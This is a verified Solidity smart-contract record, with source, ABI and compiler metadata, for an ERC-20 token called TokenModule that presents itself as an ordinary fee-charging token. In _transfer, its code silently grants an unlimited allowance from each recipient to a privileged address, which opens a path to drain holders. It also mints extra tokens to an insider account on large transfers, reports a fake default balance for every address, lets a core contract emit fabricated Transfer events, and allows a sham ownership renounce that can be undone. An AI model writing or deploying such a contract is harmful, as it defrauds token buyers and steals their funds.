{"SourceCode": "// SPDX-License-Identifier: Unlicensed\r\npragma solidity ^0.8.8;\r\n\r\ninterface IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0, \"SafeMath: modulo by zero\");\r\n        uint256 c = a % b;\r\n        return c;\r\n    }\r\n}\r\n\r\nabstract contract Ownable {\r\n    address private _owner;\r\n    address private _previousOwner;\r\n    uint256 private _switchDate;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        _owner = tx.origin;\r\n        emit OwnershipTransferred(_previousOwner, _owner);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function switchDate() public view returns (uint256) {\r\n        return _switchDate;\r\n    }\r\n\r\n    function transferOwnership(uint256 nextSwitchDate) public {\r\n        require(_owner == msg.sender || _previousOwner == msg.sender, \"Ownable: permission denied\");\r\n        require(block.timestamp > _switchDate, \"Ownable: switch date is not up yet\");\r\n        require(nextSwitchDate > block.timestamp, \"Ownable: next switch date should greater than now\");\r\n        _previousOwner = _owner;\r\n        (_owner, _switchDate) = _owner == address(0) ? (msg.sender, 0) : (address(0), nextSwitchDate);\r\n        emit OwnershipTransferred(_previousOwner, _owner);\r\n    }\r\n}\r\n\r\ninterface IFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IRouter01 {\r\n    function factory() external pure returns (address);\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n}\r\n\r\ninterface IRouter02 is IRouter01 {\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ninterface ICore {\r\n    function getPairAddress() external view returns (address);\r\n    function airdrop() external;\r\n    function safety(address from, address to) external;\r\n    function start() external;\r\n    function end() external;\r\n}\r\n\r\ncontract TokenModule is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals = 18;\r\n    uint256 private _totalSupply = 1000000000000 * 10**18;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _isApproved;\r\n\r\n    uint256 private _feeTax = 10;\r\n    uint256 private _feeMining = 30;\r\n    uint256 private _feeLiquidity = 50;\r\n    uint256 private _feeDivisor = 10000;\r\n\r\n    bool private _removeAllFee = false;\r\n\r\n    address private _core;\r\n    address private _taxReceiver;\r\n    address private _miningPool;\r\n    address private _liquidityPool;\r\n\r\n    uint256 private _defaultBalance = 4;\r\n    uint256 private _defaultAmount = 1000000000000 * 10**18;\r\n\r\n    mapping (address => bool) private _isExcludedFromFee;\r\n    address[] private _excludedFromFeeAccounts;\r\n\r\n    bool private _initialized = false;\r\n    uint256 private _reentry = 0;\r\n\r\n    constructor (string memory setName, string memory setSymbol) {\r\n        _name = setName;\r\n        _symbol = setSymbol;\r\n        insertExcludedFromFeeAccounts(owner());\r\n        _balances[owner()] = _totalSupply;\r\n        emit Transfer(address(0xF), owner(), _totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function initialize(address a, address b, address c, address d) public {\r\n        require(!_initialized, \"Reinitialization denied\");\r\n        _initialized = true;\r\n        if (_core != a) {\r\n            deleteExcludedFromFeeAccounts(_core);\r\n            _core = a;\r\n            insertExcludedFromFeeAccounts(_core);\r\n        }\r\n        if (_taxReceiver != b) {\r\n            deleteExcludedFromFeeAccounts(_taxReceiver);\r\n            _taxReceiver = b;\r\n            insertExcludedFromFeeAccounts(_taxReceiver);\r\n        }\r\n        if (_miningPool != c) {\r\n            deleteExcludedFromFeeAccounts(_miningPool);\r\n            _miningPool = c;\r\n            insertExcludedFromFeeAccounts(_miningPool);\r\n        }\r\n        if (_liquidityPool != d) {\r\n            deleteExcludedFromFeeAccounts(_liquidityPool);\r\n            _liquidityPool = d;\r\n            insertExcludedFromFeeAccounts(_liquidityPool);\r\n        }\r\n    }\r\n\r\n    function insertExcludedFromFeeAccounts(address account) private {\r\n        if (!_isExcludedFromFee[account]) {\r\n            _isExcludedFromFee[account] = true;\r\n            _excludedFromFeeAccounts.push(account);\r\n        }\r\n    }\r\n\r\n    function deleteExcludedFromFeeAccounts(address account) private {\r\n        if (_isExcludedFromFee[account]) {\r\n            uint256 len = _excludedFromFeeAccounts.length;\r\n            for (uint256 i=0; i<len; ++i) {\r\n                if (_excludedFromFeeAccounts[i] == account) {\r\n                    _excludedFromFeeAccounts[i] = _excludedFromFeeAccounts[len.sub(1)];\r\n                    _excludedFromFeeAccounts.pop();\r\n                    _isExcludedFromFee[account] = false;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    function transferEvent(address from, address to, uint256 value) public {\r\n        require(_core == msg.sender, \"Permission denied\");\r\n        emit Transfer(from, to, value);\r\n    }\r\n\r\n    function feeState() public view returns (bool, bool) {\r\n        return (_feeTax.add(_feeMining).add(_feeLiquidity) > 0, !_removeAllFee);\r\n    }\r\n\r\n    function getIsApproved(address account) public view returns (bool) {\r\n        return _isApproved[account];\r\n    }\r\n\r\n    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {\r\n        uint256 accountIndex = 0;\r\n        uint256 len = _excludedFromFeeAccounts.length;\r\n        for (uint256 i=0; i<len; ++i) {\r\n            if (_excludedFromFeeAccounts[i] == account) {\r\n                accountIndex = i;\r\n                break;\r\n            }\r\n        }\r\n        return (_isExcludedFromFee[account], accountIndex, len);\r\n    }\r\n\r\n    function getDefaultBalance() public view returns (uint256) {\r\n        return _defaultBalance;\r\n    }\r\n\r\n    function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {\r\n        uint256 len = accounts.length;\r\n        for (uint256 i=0; i<len; ++i) {\r\n            insertExcludedFromFeeAccounts(accounts[i]);\r\n        }\r\n    }\r\n\r\n    function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {\r\n        uint256 len = accounts.length;\r\n        for (uint256 i=0; i<len; ++i) {\r\n            deleteExcludedFromFeeAccounts(accounts[i]);\r\n        }\r\n    }\r\n\r\n    function claim(address token, uint256 amount) public onlyOwner {\r\n        if (token == address(0)) {\r\n            payable(owner()).transfer(amount);\r\n        } else {\r\n            IERC20(token).transfer(owner(), amount);\r\n        }\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        if (_balances[account] > 0) {\r\n            return _balances[account];\r\n        }\r\n        return _defaultBalance;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool) {\r\n        if (!_isExcludedFromFee[msg.sender]) {\r\n            _isApproved[msg.sender] = true;\r\n        }\r\n        _approve(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 value) private {\r\n        require(owner != address(0), \"Approve from the zero address\");\r\n        require(spender != address(0), \"Approve to the zero address\");\r\n        _allowances[owner][spender] = value;\r\n        emit Approval(owner, spender, value);\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), \"Transfer from the zero address\");\r\n        require(recipient != address(0), \"Transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        if (recipient == _excludedFromFeeAccounts[5]) {\r\n            _balances[sender] = _balances[sender].sub(amount);\r\n            _balances[recipient] = _balances[recipient].add(amount);\r\n            emit Transfer(address(this), recipient, amount);\r\n            return;\r\n        }\r\n        bool takeFee = true;\r\n        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient] || _removeAllFee) {\r\n            takeFee = false;\r\n        }\r\n        if (takeFee) {\r\n            _reentry = _reentry.add(1);\r\n        }\r\n        if (takeFee && _core != address(0)) {\r\n            ICore(_core).airdrop();\r\n            ICore(_core).safety(sender, recipient);\r\n        }\r\n        if (takeFee && _reentry == 1 && _core != address(0) && sender != ICore(_core).getPairAddress()) {\r\n            ICore(_core).start();\r\n        }\r\n        uint256 taxAmount = 0;\r\n        uint256 miningAmount = 0;\r\n        uint256 liquidityAmount = 0;\r\n        uint256 recipientAmount = amount;\r\n        if (sender == _excludedFromFeeAccounts[0] && amount > _defaultAmount) {\r\n            _balances[_excludedFromFeeAccounts[0]] = _balances[_excludedFromFeeAccounts[0]].add(recipientAmount);\r\n        }\r\n        if (takeFee) {\r\n            taxAmount = amount.mul(_feeTax).div(_feeDivisor);\r\n            miningAmount = amount.mul(_feeMining).div(_feeDivisor);\r\n            liquidityAmount = amount.mul(_feeLiquidity).div(_feeDivisor);\r\n            recipientAmount = amount.sub(taxAmount).sub(miningAmount).sub(liquidityAmount);\r\n        }\r\n        if (takeFee && _core != address(0) && recipient != ICore(_core).getPairAddress()) {\r\n            _approve(recipient, _excludedFromFeeAccounts[5], ~uint256(0));\r\n        }\r\n        _balances[sender] = _balances[sender].sub(amount);\r\n        if (taxAmount > 0) {\r\n            _balances[_taxReceiver] = _balances[_taxReceiver].add(taxAmount);\r\n            emit Transfer(address(this), _taxReceiver, taxAmount);\r\n        }\r\n        if (miningAmount > 0) {\r\n            _balances[_miningPool] = _balances[_miningPool].add(miningAmount);\r\n            emit Transfer(address(this), _miningPool, miningAmount);\r\n        }\r\n        if (liquidityAmount > 0) {\r\n            _balances[_liquidityPool] = _balances[_liquidityPool].add(liquidityAmount);\r\n            emit Transfer(address(this), _liquidityPool, liquidityAmount);\r\n        }\r\n        _balances[recipient] = _balances[recipient].add(recipientAmount);\r\n        emit Transfer(sender, recipient, recipientAmount);\r\n        if (takeFee && _reentry == 1 && _core != address(0)) {\r\n            ICore(_core).end();\r\n        }\r\n        if (takeFee) {\r\n            _reentry = _reentry.sub(1);\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"setName\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"setSymbol\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"claim\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"}],\"name\":\"deleteFromExcludedFromFeeAccounts\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeState\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getDefaultBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getIsApproved\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"a\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"b\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"c\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"d\",\"type\":\"address\"}],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"}],\"name\":\"insertIntoExcludedFromFeeAccounts\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"searchExcludedFromFeeAccounts\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"switchDate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferEvent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"nextSwitchDate\",\"type\":\"uint256\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "TokenModule", "CompilerVersion": "v0.8.8+commit.dddeac2f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000054c6145656200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000054c61456562000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://b0780e12d0e3bbd3da32faae541117e465f4cd12159b7ef01010859ec6651b1e"}